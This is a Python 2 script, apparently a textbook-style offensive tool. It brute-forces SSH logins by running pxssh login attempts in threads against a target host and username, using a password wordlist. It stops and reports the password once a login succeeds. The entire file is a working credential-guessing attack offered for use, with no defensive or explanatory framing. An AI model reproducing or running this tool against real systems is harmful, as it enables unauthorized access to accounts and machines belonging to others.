#coding:utf-8
#author:nothing

from pexpect import pxssh
import optparse
import time
from threading import *

maxConnections = 5
connection_lock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0
def connect(host,user,password,release):
    global Found,Fails
    try:
        s = pxssh.pxssh()
        s.login(host,user,password)
        print '[+] Password Found : ' + password
        Found = True
    except Exception,e:
        if 'read_nonblocking' in str(e):
            Fails += 1
            time.sleep(5)
            connect(host,user,password,False)
        elif 'synchronize with ioriginal prompt' in str(e):
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            connection_lock.release()
def main():
    parser = optparse.OptionParser("usage%prog " + "-H <host> -u <user> -F <Password list>")
    parser.add_option('-H', dest='tgtHost', type='string', help='target Host')
    parser.add_option('-F', dest='Passdict', type='string', help='specify Password file')
    parser.add_option('-u', dest='user', type='string', help='username')
    (options, args) = parser.parse_args()
    host = options.tgtHost
    dict = options.Passdict
    user = options.user
    if host is None or dict is None or user is None:
        print parser.usage
        exit(0)
    # user = options.user
    pwd = open(dict,'r')
    # user = options.user
    for line in pwd.readlines():
        if Found:
            print '[*] Exiting : Password Found!'
            exit(0)
        if Fails > 5:
            print '[!] Exitint : Too many Socket Timeout'
            exit(0)
        connection_lock.acquire()
        password = line.strip('\r').strip('\n')
        print '[+] Testing : ' + str(password)
        t = Thread(target=connect,args=(host,user,password,True))
        child = t.start()
if __name__ == '__main__':
    main()
